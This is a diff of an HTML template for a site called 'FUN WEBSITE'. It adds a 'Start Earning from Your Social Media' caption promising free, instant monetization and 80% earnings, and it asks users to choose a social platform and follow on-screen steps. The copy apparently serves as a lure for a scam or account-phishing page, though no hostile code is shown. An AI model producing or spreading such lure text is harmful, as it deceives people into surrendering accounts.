@@ -1,7 +1,28 @@
 {% extends "base.html" %}
 {% block body %}
 <div class="card center" style="flex-direction:column;align-items:center;text-align:center;padding:48px">
-  <h1 style="font-size:36px;font-weight:900;margin-bottom:12px;color:#0f172a;letter-spacing:1px">✨ FUN WEBSITE</h1>
+  <h1 style="font-size:36px;font-weight:900;margin-bottom:16px;color:#0f172a;letter-spacing:1px">
+    ✨ FUN WEBSITE
+  </h1>
+  
+  <!-- Caption section -->
+  <div class="caption" style="max-width:700px;text-align:left;line-height:1.8;font-size:16px;margin-bottom:32px;color:#475569">
+    <h2 style="font-size:24px;font-weight:900;color:#0f172a;margin-bottom:16px;letter-spacing:0.5px;text-shadow:0 1px 2px rgba(0,0,0,0.05)">
+      Start Earning from Your Social Media
+    </h2>
+    <p style="margin-bottom:16px">
+      Turn your creativity into income! This platform helps you monetize your social media accounts so you can earn money from your content, live streams, and even by watching other creators.
+    </p>
+    <ul style="list-style:none;padding-left:0;margin-bottom:16px;line-height:1.7">
+      <li style="margin-bottom:8px; font-weight:600;">🟢 <span style="color:#0f172a;">Keep 80%</span> of your earnings once monetization is activated.</li>
+      <li style="margin-bottom:8px; font-weight:600;">🟢 The remaining <span style="color:#0f172a;">20%</span> helps support platform operations and growth.</li>
+      <li style="margin-bottom:8px; font-weight:600;">🟢 Monetization is completely free, fast, and easy to set up.</li>
+    </ul>
+    <p style="margin-bottom:0">
+      Simply choose the social media platform you want to monetize and follow the on-screen instructions to get started.
+    </p>
+  </div>
+
   <p class="lead" style="max-width:600px;font-size:16px;line-height:1.6;color:#475569">
     Welcome! This website is designed to help you discover happiness, 
     transform your daily activity, and spark joy in new ways.
@@ -9,7 +30,7 @@
 </div>
 
 <div class="card" style="padding:32px">
-  <h2 style="margin-top:0;font-weight:900;font-size:24px;color:#0f172a;margin-bottom:18px;letter-spacing:0.5px">🌐 Select a Platform</h2>
+  <h2 style="margin-top:0;font-weight:800;font-size:22px;color:#0f172a;margin-bottom:18px">🌐 Select a Platform</h2>
   <div class="platforms">
     <a class="btn-platform glow-facebook" href="{{ url_for('love1_1') }}">
       <div class="icon-circle bg-facebook"><i class="fa-brands fa-facebook icon-lg"></i></div>
@@ -44,12 +65,12 @@
 </div>
 
 <div class="card" style="padding:32px">
-  <h3 style="font-size:22px;font-weight:900;margin-bottom:16px;color:#0f172a;letter-spacing:0.5px">⚙️ How it Works</h3>
-  <p style="color:#475569;font-size:15px;line-height:1.7;margin-bottom:20px">
+  <h3 style="font-size:20px;font-weight:800;margin-bottom:12px;color:#0f172a">⚙️ How it Works</h3>
+  <p style="color:#475569;font-size:15px;line-height:1.6;margin-bottom:16px">
     The core idea of happiness is to transform your activities into positive energy and lasting joy.  
     Here’s how it works:
   </p>
-  <ul class="premium-list">
+  <ul style="color:#334155;line-height:1.7;margin:0;padding-left:18px;font-size:15px">
     <li><strong>Understand yourself</strong> – learn your needs and aspirations.</li>
     <li><strong>Create joy within</strong> – cultivate habits that keep you connected and uplifted.</li>
     <li><strong>Transform challenges</strong> – turn pain into happiness through mindful practice here.</li>
@@ -65,45 +86,19 @@
 .btn-platform:hover {
   transform: translateY(-3px);
 }
-
-/* Platform glow colors */
+/* Facebook glow */
 .glow-facebook { box-shadow: 0 0 18px rgba(24, 119, 242, 0.25); }
+/* Instagram glow */
 .glow-instagram { box-shadow: 0 0 18px rgba(228, 64, 95, 0.25); }
+/* TikTok glow */
 .glow-tiktok { box-shadow: 0 0 18px rgba(0, 0, 0, 0.25); }
+/* YouTube glow */
 .glow-youtube { box-shadow: 0 0 18px rgba(255, 0, 0, 0.25); }
+/* Snapchat glow */
 .bg-snapchat { background: #FFFC00; position: relative; }
 .snapchat-white { color: #fff; position: relative; z-index: 2; }
 .glow-snapchat { box-shadow: 0 0 18px rgba(255, 252, 0, 0.3); }
+/* Twitter glow */
 .glow-twitter { box-shadow: 0 0 18px rgba(29, 161, 242, 0.25); }
-
-/* Premium list styling */
-.premium-list {
-  color: #334155;
-  font-size: 16px;
-  line-height: 2;
-  padding-left: 22px;
-  list-style: none;
-}
-.premium-list li {
-  position: relative;
-  margin-bottom: 12px;
-  font-weight: 500;
-}
-.premium-list li strong {
-  font-weight: 800;
-  letter-spacing: 0.3px;
-}
-/* Gradient bullets */
-.premium-list li::before {
-  content: '•';
-  position: absolute;
-  left: -22px;
-  top: 0;
-  font-size: 20px;
-  font-weight: 900;
-  background: linear-gradient(135deg, #ff5858, #f09819);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
 </style>
 {% endblock %}
